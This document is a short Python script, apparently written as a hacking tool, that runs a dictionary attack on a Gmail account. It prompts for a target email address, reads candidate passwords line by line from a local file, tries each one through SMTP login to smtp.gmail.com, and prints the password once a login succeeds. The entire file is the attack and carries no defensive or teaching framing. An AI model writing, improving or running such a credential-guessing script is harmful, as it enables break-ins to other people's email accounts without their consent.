import smtplib
file=open("password.txt","r")
target_gmail=input("ENTER THE TARGET EMAIL:")
def brut():
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(target_gmail, line)
    print("THE PASSWORD IS\n", line)
g=0
for line in file:
    if g==1:
        break
    else:
        try:
            brut()
            break
        except smtplib.SMTPAuthenticationError:
            print(line,"Wrong")















































